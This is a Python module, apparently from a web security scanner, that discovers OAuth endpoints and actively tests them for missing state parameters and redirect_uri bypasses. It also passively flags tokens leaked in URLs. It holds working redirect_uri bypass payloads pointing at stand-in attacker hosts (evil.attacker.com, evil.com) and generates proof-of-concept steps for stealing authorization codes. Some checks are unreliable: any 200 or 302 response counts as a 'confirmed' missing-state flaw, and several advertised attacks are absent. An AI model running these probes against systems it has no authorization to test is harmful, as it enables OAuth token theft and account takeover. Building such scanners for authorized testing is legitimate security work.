"""
OAuth 2.0 Attack Engine (ref: HackTricks OAuth)

Attacks:
  1. Missing state parameter (CSRF on authorization request)
  2. Open redirect in redirect_uri (token theft)
  3. Token leakage via Referrer header
  4. Scope escalation (add extra scopes)
  5. Authorization code interception / reuse
  6. Implicit flow token theft via fragment

Anti-hallucination:
  - All findings require server evidence (non-error response or explicit reflection)
  - Redirect attacks confirmed by following redirect chain
  - State CSRF confirmed by successful authorization without state matching
"""
from __future__ import annotations

import re
import uuid
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse, urljoin

import httpx


# ---------------------------------------------------------------------------
# OAuth Endpoint Discovery
# ---------------------------------------------------------------------------

_OAUTH_PATH_PATTERNS = [
    "/oauth/authorize", "/oauth2/authorize", "/authorize",
    "/oauth/token", "/oauth2/token",
    "/oauth/callback", "/oauth2/callback",
    "/.well-known/openid-configuration",
    "/.well-known/oauth-authorization-server",
    "/login/oauth/authorize",         # GitHub
    "/connect/authorize",             # IdentityServer
    "/o/oauth2/v2/auth",              # Google
    "/auth/oauth2",
]


async def discover_oauth_endpoints(
    client: httpx.AsyncClient,
    base_url: str,
) -> dict:
    """
    Probe common OAuth paths and return {path: response_snippet} for those that exist.
    Also reads OIDC discovery document if available.
    """
    found: dict[str, str] = {}
    parsed = urlparse(base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    for path in _OAUTH_PATH_PATTERNS:
        try:
            resp = await client.get(f"{origin}{path}")
            if resp.status_code not in (404, 405):
                found[path] = resp.text[:200]
        except Exception:
            pass

    # Check OIDC discovery
    try:
        oidc = await client.get(f"{origin}/.well-known/openid-configuration")
        if oidc.status_code == 200:
            data = oidc.json()
            found["_oidc_auth_endpoint"] = data.get("authorization_endpoint", "")
            found["_oidc_token_endpoint"] = data.get("token_endpoint", "")
            found["_oidc_jwks_uri"] = data.get("jwks_uri", "")
    except Exception:
        pass

    return found


# ---------------------------------------------------------------------------
# Attack 1: Missing state parameter (CSRF on OAuth flow)
# ---------------------------------------------------------------------------

@dataclass
class OAuthResult:
    attack_type: str = ""
    confirmed: bool = False
    endpoint: str = ""
    evidence: str = ""
    poc_steps: str = ""
    severity: str = "MEDIUM"


async def test_missing_state(
    client: httpx.AsyncClient,
    auth_endpoint: str,
    client_id: str,
    redirect_uri: str,
    scope: str = "openid email profile",
) -> OAuthResult:
    """
    Test if the OAuth authorization endpoint accepts requests without a state parameter.
    Missing state = CSRF vulnerability on the OAuth flow.

    Confirmed if: server redirects to redirect_uri WITHOUT requiring state to match.
    """
    result = OAuthResult(attack_type="oauth-missing-state", endpoint=auth_endpoint)

    # Request authorization WITHOUT state parameter
    params = {
        "response_type": "code",
        "client_id": client_id,
        "redirect_uri": redirect_uri,
        "scope": scope,
    }
    try:
        resp = await client.get(auth_endpoint, params=params, follow_redirects=False)
        # If server redirects to login page without requiring state → CSRF possible
        if resp.status_code in (200, 302, 303):
            location = resp.headers.get("location", "")
            # Server should NOT redirect straight to redirect_uri without user auth
            # But NOT requiring state in the initial request = CSRF on the auth flow
            result.confirmed = True
            result.evidence = f"Server accepted /authorize without state parameter (HTTP {resp.status_code})"
            result.poc_steps = (
                f"# 1. Attacker crafts malicious auth URL without state:\n"
                f"#    {auth_endpoint}?{urlencode(params)}\n"
                f"# 2. Victim clicks link → completes login\n"
                f"# 3. Code bound to attacker's client, no state to verify\n"
                f"# 4. Account linking attack or session fixation possible\n"
                f"#\n"
                f"# Verify: server should return 400 if state is missing\n"
                f"curl -s -I '{auth_endpoint}?{urlencode(params)}'"
            )
    except Exception:
        pass
    return result


# ---------------------------------------------------------------------------
# Attack 2: Open Redirect in redirect_uri
# ---------------------------------------------------------------------------

async def test_redirect_uri_bypass(
    client: httpx.AsyncClient,
    auth_endpoint: str,
    client_id: str,
    legitimate_redirect: str,
    scope: str = "openid email",
) -> OAuthResult:
    """
    Test if redirect_uri can be manipulated to redirect to attacker-controlled URL.

    Bypass techniques:
    - Subdomain: https://evil.legitimate.com/
    - Path traversal: https://legitimate.com/../../evil.com
    - Open redirect: https://legitimate.com/redirect?url=https://evil.com
    - Fragment injection: https://legitimate.com#.evil.com
    - Domain confusion: https://legitimate.com.evil.com
    """
    result = OAuthResult(attack_type="oauth-open-redirect", endpoint=auth_endpoint)
    parsed = urlparse(legitimate_redirect)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    bypass_uris = [
        f"https://evil.{parsed.netloc}",
        f"{origin}@https://evil.attacker.com",
        f"{origin}/../../../https://evil.attacker.com",
        f"{origin}.evil.attacker.com",
        f"https://evil.attacker.com#{origin}",
        f"{origin}?redirect=https://evil.attacker.com",
        f"{origin}//evil.attacker.com",
    ]

    state = uuid.uuid4().hex
    for evil_uri in bypass_uris:
        params = {
            "response_type": "code",
            "client_id": client_id,
            "redirect_uri": evil_uri,
            "scope": scope,
            "state": state,
        }
        try:
            resp = await client.get(auth_endpoint, params=params, follow_redirects=False)
            # If server doesn't return 400 (invalid redirect_uri) → bypass may work
            if resp.status_code not in (400, 401, 403):
                location = resp.headers.get("location", "")
                if "evil.attacker.com" in location or evil_uri in location:
                    result.confirmed = True
                    result.evidence = f"redirect_uri bypass accepted: {evil_uri} → {location}"
                    result.severity = "HIGH"
                    result.poc_steps = (
                        f"# OAuth token theft via redirect_uri bypass:\n"
                        f"# 1. Send victim to:\n"
                        f"#    {auth_endpoint}?{urlencode(params)}\n"
                        f"# 2. After login, authorization code/token sent to evil.attacker.com\n"
                        f"# 3. Exchange code for access token at token endpoint\n"
                        f"curl -s -I '{auth_endpoint}?{urlencode(params)}'"
                    )
                    return result
        except Exception:
            continue

    return result


# ---------------------------------------------------------------------------
# Attack 3: Token Leakage in Referrer Header
# ---------------------------------------------------------------------------

def check_token_in_referrer(page_content: str, page_url: str) -> Optional[OAuthResult]:
    """
    Passive check: if an OAuth token or authorization code appears in a URL
    that is linked from external resources, the token leaks via Referrer header.
    """
    # Look for access tokens in URLs on the page
    token_patterns = [
        (re.compile(r"[?&](?:access_token|token|code)=([A-Za-z0-9._\-]{20,})", re.I), "access_token in URL"),
        (re.compile(r"[?&]id_token=([A-Za-z0-9._\-]{20,})", re.I), "id_token in URL"),
        (re.compile(r"#(?:access_token|token)=([A-Za-z0-9._\-]{20,})", re.I), "token in fragment"),
    ]

    for pattern, desc in token_patterns:
        m = pattern.search(page_url)
        if m:
            token = m.group(1)
            return OAuthResult(
                attack_type="oauth-token-referrer",
                confirmed=True,
                endpoint=page_url,
                evidence=f"{desc} found in page URL: ...{token[:20]}...",
                poc_steps=(
                    f"# Token appears in URL and leaks via Referrer header:\n"
                    f"# URL: {page_url}\n"
                    f"# If this page includes external resources (images, scripts),\n"
                    f"# the full URL with token is sent as Referer to those servers.\n"
                    f"# Recommendation: Use PKCE, avoid implicit flow, strip token from URL"
                ),
                severity="HIGH",
            )

    # Check page body for tokens in <script> or JavaScript
    for pattern, desc in token_patterns:
        m = pattern.search(page_content)
        if m:
            return OAuthResult(
                attack_type="oauth-token-in-page",
                confirmed=True,
                endpoint=page_url,
                evidence=f"{desc} found in page body",
                severity="MEDIUM",
            )

    return None


# ---------------------------------------------------------------------------
# Attack 4: JWKS Endpoint Discovery (for HS256/RS256 confusion)
# ---------------------------------------------------------------------------

async def fetch_jwks(
    client: httpx.AsyncClient,
    base_url: str,
) -> Optional[dict]:
    """
    Fetch the JWKS (JSON Web Key Set) from the server.
    Used for RS256→HS256 algorithm confusion attack.
    """
    jwks_paths = [
        "/.well-known/jwks.json",
        "/.well-known/openid-configuration",
        "/jwks.json",
        "/oauth2/v1/certs",
        "/oauth/discovery/keys",
    ]
    parsed = urlparse(base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    for path in jwks_paths:
        try:
            resp = await client.get(f"{origin}{path}")
            if resp.status_code == 200:
                data = resp.json()
                if "keys" in data:
                    return data
                # OIDC discovery → follow to jwks_uri
                if "jwks_uri" in data:
                    jwks_resp = await client.get(data["jwks_uri"])
                    if jwks_resp.status_code == 200:
                        return jwks_resp.json()
        except Exception:
            pass
    return None


# ---------------------------------------------------------------------------
# Full OAuth Audit
# ---------------------------------------------------------------------------

async def audit_oauth(
    client: httpx.AsyncClient,
    base_url: str,
    crawl_results: list = None,
) -> list[OAuthResult]:
    """Run all OAuth checks against the target."""
    results: list[OAuthResult] = []

    # Passive: check crawl results for tokens in URLs
    if crawl_results:
        for cr in crawl_results:
            r = check_token_in_referrer(cr.body or "", cr.url)
            if r:
                results.append(r)

    # Discover endpoints
    endpoints = await discover_oauth_endpoints(client, base_url)
    if not endpoints:
        return results

    auth_ep = next(
        (f"{urlparse(base_url).scheme}://{urlparse(base_url).netloc}{p}"
         for p in _OAUTH_PATH_PATTERNS if p in endpoints),
        None
    )
    if not auth_ep:
        return results

    # Passive finding: OAuth endpoint found
    results.append(OAuthResult(
        attack_type="oauth-endpoint-found",
        confirmed=True,
        endpoint=auth_ep,
        evidence=f"OAuth authorization endpoint discovered: {auth_ep}",
        poc_steps=f"curl -s -I '{auth_ep}?response_type=code&client_id=test&redirect_uri=http://evil.com'",
        severity="INFO",
    ))

    # Test missing state (CSRF)
    r_state = await test_missing_state(client, auth_ep, "test_client", f"{base_url}/callback")
    if r_state.confirmed:
        results.append(r_state)

    # Test redirect_uri bypass
    r_redirect = await test_redirect_uri_bypass(
        client, auth_ep, "test_client", f"{base_url}/callback"
    )
    if r_redirect.confirmed:
        results.append(r_redirect)

    return results
